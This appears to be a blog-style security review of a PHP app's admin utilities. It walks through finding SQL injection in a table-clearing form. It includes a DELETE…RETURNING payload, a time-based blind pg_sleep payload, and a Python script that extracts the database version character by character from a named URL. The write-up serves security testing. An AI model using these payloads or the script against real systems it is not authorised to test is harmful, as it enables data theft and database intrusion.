    Introduction

    Hi again!

    I'm taking a look at the little admin utilities that I have throughout the app. I'm gonna say it—I think this one just might be a straightforward session: they're pretty much all just single files (as far as I remember), and there aren't too many of them.

    I think I already have a fair idea of what might be wrong with them as well.

    Let's go.


    As always, before I get started, let's convert those "fair" ideas into concrete ideas. We need a scope for today.

    Many of these cheeky little utils are at the root of the app. They are:

    • users.php - this one's dangerous. Simple little HTML form. If you enter the right admin password (which I bet you is hardcoded lmao) then it'll go to the db and dump the entire users table for you.
    • clear.php - this one's pretty wild too. Another HTML form—this one has a dropdown for you to pick a database table. Enter the right admin password and it'll literally DELETE EVERY ROW from that table for you. WHY??
    • blacklist.php - this one's coming back because it writes to a file called log.txt, and we might be able to find a way to turn it into a side channel.
    • conn.php - not technically an admin utility per se, but this is the file that gets require()'d by every file which interact with the database. It basically creates the PDO object that the other files use to run db queries. I wouldn't be surprised to find more hardcoded credentials lol, worth a look.

    Alrighty. conn.php looks the simplest right now, so we'll start from there. After that, we'll just go from the top of the list and work our way down. users.php and clear.php are honestly way too risky to even exist, but they're here for some reason lol, so let's see what I can do with em.

    Alright, fair enough. Ok, I just gotta make the DELETE statement return something then. It's time for the return of the RETURNING clause lol, love that thing.

    New payload: users WHERE 1=0 RETURNING (SELECT version())

    So then the full query becomes: DELETE FROM users WHERE 1=0 RETURNING (SELECT version()). Nothing actually gets deleted, and we get to make it kick back literally anything we want. Let's give that a shot...

    Ok, interesting. So clearly the query ran as intended, but we don't see any results here. Only the query string itself. Does that have to do with the fact that it's a DELETE statement somehow?

    Oh lmao, I looked it up, this is kinda funny. We're var_dumping the $data var, yes, but that's just a PDOStatement object, not the actual return data of the SQL query. The PDO query method we're using here returns false if the query failed, and a PDOStatement object if it was successful—you have to call ->fetch() on it to actually get the data inside it.

    So I found a genuine SQLi with a working exfil technique, but the app is so poorly written that it doesn't even read it's own query results lol.

    Ok, well no problem then. Just makes things slightly more complex for us—since we've confirmed that SQLi is possible here, we could probably just do time-based blind. So like:

    users WHERE (SELECT CASE WHEN substring(version(),1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NULL

    And then after that WHEN substring(version(),1,1)='b', and then WHEN substring(version(),1,1)='c' and so on. Ideally we'd write like a python script or something to automate this. It really helps that there's no rate-limiting as well—it'd probably be pretty fast.

    Just threw this together, gonna give it a shot:

    import requests
import string
import time

url = "https://parity.nimbusdigital.org/clear.php"
passwd = "redacted123"
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_.-: ()"

print("Starting...")

result = ""
pos = 1

while True:
    found = False

    for c in chars:
        tbl = f"users WHERE (SELECT CASE WHEN substring(version(),{pos},1)='{c}' THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NULL"
        start = time.time()
        requests.post(url, data={"pass": passwd, "tbl": tbl})

        if (time.time() - start) >= 3: # over our time threshold; we got one
            result += c
            print(f"Char at position {pos} = '{c}' : {result}")
            found = True
            break

    if not found:
        break

    pos += 1

print(f"Done! Result: {result}")

    I think this should work. Let's see...
